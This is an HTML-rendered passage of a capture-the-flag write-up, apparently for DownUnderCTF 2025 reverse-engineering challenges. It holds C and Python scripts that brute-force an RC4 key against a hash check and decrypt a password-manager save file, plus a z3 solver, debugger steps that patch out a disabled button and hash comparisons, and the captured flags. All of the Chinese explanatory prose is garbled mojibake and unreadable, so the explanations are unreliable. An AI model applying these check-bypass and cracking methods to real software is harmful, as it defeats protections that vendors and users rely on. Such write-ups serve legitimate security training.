class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *a, <span class="type">unsigned</span> <span class="type">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        sbox[i] = i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> keyLen = <span class="built_in">strlen</span>((<span class="type">char</span> *)key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Ttable[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        Ttable[i] = key[i % keyLen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + sbox[i] + Ttable[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RC4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> data[], <span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k, i = <span class="number">0</span>, j = <span class="number">0</span>, t;</span><br><span class="line">    <span class="built_in">init_sbox</span>(key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dataLen = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> h = <span class="number">0</span>; h &lt; dataLen; h++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + sbox[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">        t = (sbox[i] + sbox[j]) % <span class="number">256</span>;</span><br><span class="line">        k = sbox[t];</span><br><span class="line">        data[h] ^= k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF9EFF01630</span><span class="params">(<span class="type">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 result&#123;&#125;; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> v3&#123;&#125;;         <span class="comment">// r8d</span></span><br><span class="line">    <span class="type">char</span> *v4&#123;&#125;;       <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span> *i&#123;&#125;;        <span class="comment">// rdx</span></span><br><span class="line">    __int64 v6&#123;&#125;;     <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">    v4 = &amp;a1[<span class="number">2</span> * a2];</span><br><span class="line">    <span class="keyword">for</span> (i = a1; *(WORD *)i; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= v4)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = <span class="number">2</span> * ((i - a1) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (result = <span class="number">5381</span>; v6; --v6)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *a1++;</span><br><span class="line">        result = v3 ^ (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">33</span> * result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">9</span>] = &#123;</span><br><span class="line">        <span class="number">0x7A</span>, <span class="number">0x6D</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">0</span>; c &lt; <span class="number">0xffffff</span>; c++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> data2[<span class="number">32</span>] = &#123;</span><br><span class="line">            <span class="number">0xD0</span>, <span class="number">0xE9</span>, <span class="number">0xC1</span>, <span class="number">0x5A</span>, <span class="number">0x9E</span>, <span class="number">0x0C</span>, <span class="number">0x28</span>, <span class="number">0x31</span>, <span class="number">0x58</span>, <span class="number">0x24</span>, <span class="number">0x5D</span>, <span class="number">0x68</span>, <span class="number">0x54</span>, <span class="number">0x8D</span>, <span class="number">0x6F</span>, <span class="number">0xE7</span>,</span><br><span class="line">            <span class="number">0xF6</span>, <span class="number">0xDB</span>, <span class="number">0xD7</span>, <span class="number">0xE5</span>, <span class="number">0xC0</span>, <span class="number">0x4B</span>, <span class="number">0x28</span>, <span class="number">0x46</span>, <span class="number">0xE7</span>, <span class="number">0xA4</span>, <span class="number">0x7E</span>, <span class="number">0xCD</span>, <span class="number">0x07</span>, <span class="number">0xF8</span>, <span class="number">0xF4</span>, <span class="number">0x41</span>&#125;;</span><br><span class="line">        key[<span class="number">4</span>] = c &amp; <span class="number">0xff</span>;</span><br><span class="line">        key[<span class="number">5</span>] = (c &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">        key[<span class="number">3</span>] = (<span class="number">0x1ACB</span> &gt;&gt; <span class="number">3</span>) ^ <span class="number">0x36</span>;</span><br><span class="line">        key[<span class="number">6</span>] = (c &amp; <span class="number">0xff</span>) ^ ((c &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) ^ ((c &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) ^ <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">RC4</span>(data2, key);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> result = <span class="built_in">sub_7FF9EFF01630</span>((<span class="type">char</span> *)data2, <span class="number">32</span> &gt;&gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="number">0x69FA99D</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c\n&quot;</span>, c &amp; <span class="number">0xff</span>, (c &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>, (c &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ydr</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®å‰è¾“å…¥ï¼š</p><blockquote><p>Hydr0ph110a3</p></blockquote><p>è¿™è¾¹æ˜¯æ ¡éªŒp[9]ï¼Œé€šè¿‡çˆ†ç ´å°±å¯ä»¥å¾—åˆ°p[9]</p><p><img src="/2025/07/21/DownUnderCTF2025/image-33.png" alt="alt text"></p><p>çˆ†ç ´ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">32</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((i ^ <span class="number">0xcb</span> &amp; <span class="number">0x64</span>) == <span class="number">0x2e</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// p[9] = &#x27;n&#x27;</span></span><br></pre></td></tr></table></figure><p>ç›®å‰è¾“å…¥ï¼š</p><blockquote><p>Hydr0ph11na3</p></blockquote><p>åªå‰©ä¸‹p[7] p[8]ä»¥åŠp[11]ï¼Œä½†æ˜¯å·²ç»çŸ¥é“p[7]&#x3D;&#x3D;p[8]ä¸”åªèƒ½æ˜¯12345678å…¶ä¸­ä¸€ä¸ªï¼Œp[11]&#x3D;&#x3D;p[7]-2ï¼Œé‚£ä¹ˆæ‰‹åŠ¨è¾“å…¥è¯•è¯•å°±å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„æ­£ç¡®passwordã€‚</p><p>æœ€åå°è¯•å‘ç°åˆ†åˆ«å°±æ˜¯1ã€1ã€3ã€‚</p><p>æœ€ç»ˆè¾“å…¥ï¼š</p><blockquote><p>Hydr0ph11na3</p></blockquote><p><img src="/2025/07/21/DownUnderCTF2025/image-34.png" alt="alt text"></p><p><strong>DUCTF{the_problem_with_dynamic_languages_is_you_cant_c_types}</strong></p><h2 id="SwiftPasswordManager-ClickMe"><a href="#SwiftPasswordManager-ClickMe" class="headerlink" title="SwiftPasswordManager-ClickMe"></a>SwiftPasswordManager-ClickMe</h2><p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œå¯çŸ¥çª—å£ç•Œé¢æœ‰ä¸€ä¸ªFlagæŒ‰é’®ï¼Œä½†æ˜¯æ— æ³•ç‚¹å‡»ï¼Œåº”è¯¥æ˜¯åˆå§‹åŒ–æ§ä»¶çš„æ—¶å€™è¢«ç¦ç”¨äº†ã€‚</p><p>å°è¯•å­—ç¬¦ä¸²æœç´¢Flagï¼Œä½†æ˜¯æ²¡æœåˆ°ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å› ä¸º4å­—èŠ‚å­—ç¬¦ä¸²æ¯”è¾ƒçŸ­ï¼Œç›´æ¥è¢«ä¼˜åŒ–æˆ4å­—èŠ‚ç«‹å³æ•°åœ¨æ±‡ç¼–é‡Œé¢ï¼Œç›´æ¥æœFlagå­—ç¬¦ä¸²çš„å­—èŠ‚ï¼Œå¯ä»¥æœç´¢åˆ°ï¼Œåç¼–è¯‘ç•Œé¢è¿™è¾¹å¯ä»¥çœ‹åˆ°æ˜¯Flagå­—ç¬¦ä¸²ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-35.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-36.png" alt="alt text"></p><p>ä¸Šå›¾å¯ä»¥çœ‹åˆ°ä¸‹é¢æœ‰ä¸ªï¼Œä»å‘½åä¸éš¾çŒœå‡ºæ˜¯ç¦ç”¨æŒ‰é’®çš„å‡½æ•°ã€‚</p><blockquote><p>View.disabled(_:)(1, &amp;type metadata for Button, &amp;protocol witness table for Button);</p></blockquote><p>æ–­ç‚¹å‡½æ•°è°ƒç”¨å¤„ï¼Œå†™æ–­ç‚¹å‘½ä»¤ï¼Œå°†ediä¹Ÿå°±æ˜¯å‚æ•°1æ”¹æˆ0å³å¯ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-38.png" alt="alt text"></p><p>è°ƒè¯•è¿è¡Œç¨‹åºï¼Œè™½ç„¶FlagæŒ‰é’®æ ·å¼è¿˜æ˜¯ç¦ç”¨çš„ï¼Œä½†æ˜¯å¯ä»¥ç‚¹å‡»ï¼Œç‚¹å‡»å°±å¼¹å‡ºFlagã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-39.png" alt="alt text"></p><p><strong>DUCTF{just_because_the_button_is_greyed_out_doesnt_mean_you_cant_use_it}</strong></p><h2 id="SwiftPasswordManager-LoadMe"><a href="#SwiftPasswordManager-LoadMe" class="headerlink" title="SwiftPasswordManager-LoadMe"></a>SwiftPasswordManager-LoadMe</h2><p>ç‚¹å‡»LoadæŒ‰é’®ï¼Œæç¤ºæ²¡æœ‰æŒ‰é’®äº‹ä»¶å®ç°ï¼Œé‚£ä¹ˆåªèƒ½ä»SaveæŒ‰é’®äº‹ä»¶é€†å‘å‡ºä¿å­˜çš„æ–‡ä»¶ç»“æ„ï¼Œç„¶åå†™è§£å¯†ï¼Œåˆ©ç”¨é¢˜ç›®æä¾›çš„â€DUCTF2025!â€å¯†ç è¿›è¡Œè§£å¯†é¢˜ç›®ç»™çš„åŠ å¯†æ–‡ä»¶ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-40.png" alt="alt text"></p><p>å‡½æ•°å¯ä»¥æœåˆ°saveFileçš„å‡½æ•°å®ç°ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-41.png" alt="alt text"></p><p>é‡Œé¢è°ƒç”¨çš„ä¸€ä¸ªå‡½æ•°å°±æ˜¯æ ¸å¿ƒå‡½æ•°ï¼ŒåŠ å¯†æ•°æ®å¯¼å‡ºåˆ°æ–‡ä»¶çš„ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-42.png" alt="alt text"></p><p>ç”±äºå‡½æ•°ä»£ç é‡å¤§éš¾è¯»æ‡‚ï¼Œç›´æ¥å°†æ•´ä¸ªå‡½æ•°ä¸¢ç»™Gemini2.5 Proè¿›è¡Œåˆ†æï¼Œå¾—åˆ°ä»¥ä¸‹æ–‡ä»¶ç»“æ„ã€‚</p><table><thead><tr><th align="center">å­—èŠ‚æ•°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">4</td><td align="center">â€œSMP1â€</td></tr><tr><td align="center">4</td><td align="center">0x01 0x00 0x00 0x00</td></tr><tr><td align="center">2</td><td align="center">Salté•¿åº¦</td></tr><tr><td align="center">32</td><td align="center">Saltæ•°æ®</td></tr><tr><td align="center">2</td><td align="center">Nonceé•¿åº¦</td></tr><tr><td align="center">å¯å˜</td><td align="center">Nonceæ•°æ®</td></tr><tr><td align="center">2</td><td align="center">Tagé•¿åº¦</td></tr><tr><td align="center">å¯å˜</td><td align="center">Tagæ•°æ®</td></tr><tr><td align="center">4</td><td align="center">å¯†æ–‡é•¿åº¦</td></tr><tr><td align="center">å¯å˜</td><td align="center">å¯†æ–‡</td></tr></tbody></table><p>å¤§è‡´ä»£ç æµç¨‹ï¼š</p><ol><li>è·å–32ä¸ªéšæœºæ•°å­—èŠ‚</li><li>å°†32ä¸ªéšæœºæ•°å­—èŠ‚ä½œä¸ºSaltå¯¹å¯†ç è¿›è¡Œ0xAAAAæ¬¡hash</li><li>ç”ŸæˆNonceã€Tagï¼Œå°†hashåçš„æ•°æ®å½“ä½œAESå¯†é’¥ã€‚</li><li>å°†Titleã€Usernameã€Passwordã€Notesè¿›è¡ŒAES GCMåŠ å¯†</li><li>æŒ‰ä»¥ä¸Šè¡¨æ ¼ç»“æ„å†™åˆ°æ–‡ä»¶ã€‚</li></ol><p>é‚£ä¹ˆä»åŠ å¯†æ–‡ä»¶è¯»å–Saltã€Nonceã€Tagã€å¯†æ–‡ï¼Œå°±å¯ä»¥è¿›è¡Œå¯†é’¥ç”Ÿæˆ+AESè§£å¯†ï¼Œå¾—åˆ°æ˜æ–‡ã€‚</p><h3 id="è§£å¯†ä»£ç "><a href="#è§£å¯†ä»£ç " class="headerlink" title="è§£å¯†ä»£ç "></a>è§£å¯†ä»£ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers.aead <span class="keyword">import</span> AESGCM</span><br><span class="line"><span class="keyword">from</span> cryptography.exceptions <span class="keyword">import</span> InvalidTag</span><br><span class="line"></span><br><span class="line">PASSWORD = <span class="string">&quot;DUCTF2025!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_key</span>(<span class="params">password: <span class="built_in">bytes</span>, salt: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    derived_key = password</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xAAAA</span>):</span><br><span class="line">        hasher = hashlib.sha256()</span><br><span class="line">        hasher.update(derived_key)</span><br><span class="line">        hasher.update(salt)</span><br><span class="line">        derived_key = hasher.digest()</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> derived_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params">file_path: <span class="built_in">str</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        magic_number = f.read(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        magic_number2 = struct.unpack(<span class="string">&#x27;&lt;HH&#x27;</span>, f.read(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        salt_len, = struct.unpack(<span class="string">&#x27;&lt;H&#x27;</span>, f.read(<span class="number">2</span>))</span><br><span class="line">        salt = f.read(salt_len)</span><br><span class="line"></span><br><span class="line">        nonce_len, = struct.unpack(<span class="string">&#x27;&lt;H&#x27;</span>, f.read(<span class="number">2</span>))</span><br><span class="line">        nonce = f.read(nonce_len)</span><br><span class="line"></span><br><span class="line">        tag_len, = struct.unpack(<span class="string">&#x27;&lt;H&#x27;</span>, f.read(<span class="number">2</span>))</span><br><span class="line">        tag = f.read(tag_len)</span><br><span class="line"></span><br><span class="line">        ciphertext_len, = struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, f.read(<span class="number">4</span>))</span><br><span class="line">        ciphertext = f.read(ciphertext_len)</span><br><span class="line"></span><br><span class="line">        password_bytes = PASSWORD.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        encryption_key = derive_key(password_bytes, salt)</span><br><span class="line"></span><br><span class="line">        aesgcm = AESGCM(encryption_key)</span><br><span class="line"></span><br><span class="line">        encrypted_data_with_tag = ciphertext + tag</span><br><span class="line">        </span><br><span class="line">        decrypted_data = aesgcm.decrypt(nonce, encrypted_data_with_tag, <span class="literal">None</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(decrypted_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    encrypted_file = <span class="string">r&quot;passwords.spm&quot;</span></span><br><span class="line">    decrypt_file(encrypted_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\x01\x00\x00\x00\x1a\x1c\x86\xd2\x7f\xa8EQ\xbe\xd1\xcc\n\x04e\x8f&lt;\x08\x00\x00\x00computer\x04\x00\x00\x00user\r\x00\x00\x00cool password7\x00\x00\x00DUCTF&#123;the_password_is_cool_but_the_flag_is_even_cooler&#125;\xd4\x82^h\x00\x00\x00\x00\xe7\x82^h\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>DUCTF{the_password_is_cool_but_the_flag_is_even_cooler}</strong></p><h2 id="SwiftPasswordManager-CrackMe"><a href="#SwiftPasswordManager-CrackMe" class="headerlink" title="SwiftPasswordManager-CrackMe"></a>SwiftPasswordManager-CrackMe</h2><p>é¢˜ç›®è¯´å¦‚æœè¾“å…¥ä¸€ä¸ªå¥½çš„Passwordï¼Œå°±ä¼šè·å¾—ä¸€ä¸ªFlagï¼Œé‚£ä¹ˆåº”è¯¥å°±æ˜¯åœ¨ç¼–è¾‘æ¡†è¾“å…¥äº‹ä»¶åšäº†ä»€ä¹ˆæ ¡éªŒã€‚</p><p>å‡½æ•°çª—å£å¯ä»¥æœåˆ°onChangeäº‹ä»¶ï¼ŒæŸ¥çœ‹äº¤å‰è°ƒç”¨å‘ç°å°±è¿™ä¸€å¤„è°ƒç”¨äº†ï¼Œå‚æ•°1å‡½æ•°å°±æ˜¯OnChangeäº‹ä»¶çš„å›è°ƒå‡½æ•°ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-46.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-47.png" alt="alt text"></p><p>å¼€å¤´æ˜¯æ£€æµ‹è¾“å…¥çš„å­—ç¬¦ä¸²çš„Prefixå’ŒSuffixï¼Œä¹Ÿå°±æ˜¯å‰ç¼€å’Œåç¼€æ˜¯å¦ä¸ºâ€DUâ€å’Œâ€.}â€ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-48.png" alt="alt text"></p><p>ä¸‹é¢æœ‰å¤šæ¬¡å•å­—èŠ‚æ ¡éªŒï¼Œä»¥è¿™ä¸ªä¸ºä¾‹å­ã€‚</p><p>å…ˆè°ƒç”¨_sSS5index_8offsetBySS5IndexVAD_SitFè·å–ä¸€ä¸ªå®ä¾‹ï¼Œå‚æ•°2çš„2æŒ‡çš„æ˜¯è¾“å…¥å­—ç¬¦ä¸²çš„ä¸‹æ ‡2ï¼Œç„¶åè°ƒç”¨_sSSySJSS5IndexVcigè·å–å­—ç¬¦ä¸²ä¸‹æ ‡2çš„å­—èŠ‚ï¼Œç„¶åxor â€˜Câ€™ï¼Œè¦è®©æ¡ä»¶ä¸æ»¡è¶³ï¼Œä¹Ÿå°±æ˜¯ä¸‹æ ‡2çš„å­—ç¬¦è¦æ˜¯â€™Câ€™ï¼Œè¿™æ ·å°±å¾—åˆ°äº†ä¸€ä¸ªå·²çŸ¥æ˜æ–‡å­—èŠ‚ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-49.png" alt="alt text"></p><p>ä»å‰é¢çš„è¿™å‡ ä¸ªç›¸åŒçš„åˆ¤æ–­ä»£ç ï¼Œå¯ä»¥å¾—åˆ°å®Œæ•´çš„å¼€å¤´å’Œç»“å°¾ï¼Œå¼€å¤´æ˜¯â€DUCTF{â€œï¼Œç»“å°¾æ˜¯â€.}â€ã€‚</p><p>ä¸‹é¢æ¥ç€åˆ¤æ–­å»æ‰å‰ç¼€â€DUCTF{â€œå’Œåç¼€â€.}â€å‰©ä¸‹çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º0x1Dã€‚</p><p>é‚£ä¹ˆå…ˆæ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²æ–¹ä¾¿åŠ¨è°ƒè§‚å¯Ÿæ•°æ®ã€‚</p><blockquote><p>DUCTF{1234567890abcdefghijklmnopqrs.}</p></blockquote><p><img src="/2025/07/21/DownUnderCTF2025/image-50.png" alt="alt text"></p><p>è·å–å»æ‰å‰åç¼€çš„å­—ç¬¦ä¸²ï¼Œè·å–æœ€åä¸€ä½æ˜¯å¦ä¸ºâ€.â€ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-51.png" alt="alt text"></p><p>ç„¶åæ˜¯ä¸¤æ¬¡hashåˆ¤æ–­ï¼Œç¬¬ä¸€æ¬¡æ˜¯å°†å»å‰åç¼€å­—ç¬¦ä¸²è¿›è¡Œhashï¼Œåˆ¤æ–­ä½32ä½ï¼Œç¬¬äºŒæ¬¡æ˜¯å°†å»å‰åç¼€å­—ç¬¦ä¸²ç¿»è½¬ï¼Œå†è¿›è¡Œhashï¼Œåˆ¤æ–­é«˜32ä½ï¼Œä¸¤æ¬¡åˆ¤æ–­æ ¡éªŒï¼Œè¿™è¾¹ç›®å‰å°±åªèƒ½å°†è¿™ä¸¤ä¸ªæ ¡éªŒç»•è¿‡ï¼Œå› ä¸ºä¸çŸ¥é“å®Œæ•´çš„è¾“å…¥ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-52.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-53.png" alt="alt text"></p><p>éƒ½åœ¨cmpå¤„å°†å¯¹åº”æ¯”å¯¹å€¼æ”¹æˆç›®æ ‡å€¼å°±å¯ä»¥ç»•è¿‡ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-54.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-55.png" alt="alt text"></p><p>è¿™è¾¹å°†å­—ç¬¦ä¸²é‡æ–°æ‰“ä¹±ï¼Œä¸‹é¢é€šè¿‡ä¸‹æ ‡å–å­—ç¬¦çš„æ—¶å€™è¦æ³¨æ„ï¼ŒåŠ¨è°ƒçœ‹å®é™…å–å‡ºæ•°æ®æ˜¯å¤šå°‘ï¼Œç„¶åå»çœ‹å¯¹åº”è¾“å…¥çš„åŸå­—ç¬¦ä¸²ä¸‹æ ‡æ˜¯å¤šå°‘ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-56.png" alt="alt text"></p><p>ä¸‹é¢è·Ÿç€çš„éƒ½æ˜¯å·®ä¸å¤šçš„xoræ¯”å¯¹ï¼Œæœ‰å•å­—èŠ‚æœ‰å¤šå­—èŠ‚ï¼Œéƒ½æ˜¯ä¸€æ ·çš„åšæ³•å¾—åˆ°å¯¹åº”ä½ç½®çš„æ˜æ–‡å­—èŠ‚ã€‚</p><p>æœ‰ä¸ªç‰¹æ®Šçš„ï¼Œæ˜¯æ–¹ç¨‹ç»„ï¼Œä¸‹é¢æ³¨é‡Šçš„ä¸‹æ ‡æ˜¯å¯¹åº”åŸå®Œæ•´å­—ç¬¦ä¸²çš„ä¸‹æ ‡ï¼ŒåŒ…æ‹¬å‰åç¼€çš„ï¼Œä½¿ç”¨Z3æ±‚è§£å³å¯å¾—åˆ°ä¸‰ä¸ªå­—ç¬¦ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-57.png" alt="alt text"></p><p>z3è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p20 = Int(<span class="string">&#x27;p20&#x27;</span>)</span><br><span class="line">p21 = Int(<span class="string">&#x27;p21&#x27;</span>)</span><br><span class="line">p30 = Int(<span class="string">&#x27;p30&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(p20 + <span class="number">2</span>*p21 + <span class="number">3</span>*p30 == <span class="number">383</span>)</span><br><span class="line">s.add(<span class="number">5</span>*p21 + <span class="number">4</span>*p20 + <span class="number">6</span>*p30 == <span class="number">959</span>)</span><br><span class="line">s.add(<span class="number">9</span>*(p20 + p30) + <span class="number">8</span>*p21 == <span class="number">1641</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p20 = <span class="subst">&#123;m[p20]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p21 = <span class="subst">&#123;m[p21]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p30 = <span class="subst">&#123;m[p30]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution 